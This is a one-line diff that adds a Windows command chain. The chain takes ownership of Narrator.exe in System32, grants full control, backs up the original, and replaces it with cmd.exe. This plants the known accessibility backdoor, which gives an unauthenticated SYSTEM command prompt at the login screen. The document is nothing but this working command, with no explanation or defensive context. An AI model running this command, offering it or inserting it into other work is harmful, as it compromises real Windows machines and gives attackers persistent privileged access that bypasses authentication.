@@ -1,0 +1,1 @@
+takeown /f C:\Windows\System32\Narrator.exe && icacls C:\Windows\System32\Narrator.exe /grant Administrators:F && copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator.bak.exe && copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
